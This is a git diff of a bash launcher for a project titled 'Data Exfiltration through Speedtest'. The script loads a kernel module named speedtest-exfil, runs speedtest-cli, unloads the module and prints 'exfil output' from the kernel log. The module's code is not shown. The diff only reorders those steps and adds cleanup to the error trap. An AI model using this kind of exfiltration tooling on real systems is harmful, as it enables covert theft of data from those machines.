@@ -15,7 +15,7 @@ echo -e "${BOLD}${SPEEDTEST_PURPLE}║  Data Exfiltration through Speedtest   �
 echo -e "${BOLD}${SPEEDTEST_PURPLE}║  ${DIM}${ITALIC}Author: Janessa Palmieri${NC}${BOLD}${SPEEDTEST_PURPLE}              ║${NC}"
 echo -e "${BOLD}${SPEEDTEST_PURPLE}╚════════════════════════════════════════╝${NC}"
 
-trap 'echo -e "\n${RED}Error: something went wrong. Exiting.${NC}" >&2; exit 1' ERR
+trap 'echo -e "\n${RED}Error: something went wrong. Cleaning up...${NC}" >&2; sudo rmmod speedtest_exfil 2>/dev/null; make clean 2>/dev/null; exit 1' ERR
 set -e
 
 # Check dependencies
@@ -72,14 +72,12 @@ echo -e "${YELLOW}Loading LKM...${NC}"
 sudo insmod speedtest-exfil.ko
 
 echo ""
+echo -e "${GREEN}Running speedtest...${NC}"
+speedtest-cli
+sudo rmmod speedtest_exfil && make clean
+
 if [ "$choice" == "1" ]; then
-    echo -e "${GREEN}Running speedtest...${NC}"
-    speedtest-cli
-    sudo rmmod speedtest_exfil && make clean
     echo ""
     echo -e "${BOLD}${SPEEDTEST_PURPLE}Total exfil output:${NC}"
     sudo dmesg | tail -1
-else
-    echo -e "${GREEN}Done! Run your Speedtest now.${NC}"
-    echo -e "When finished, run: ${YELLOW}sudo rmmod speedtest-exfil.ko && make clean${NC}"
 fi
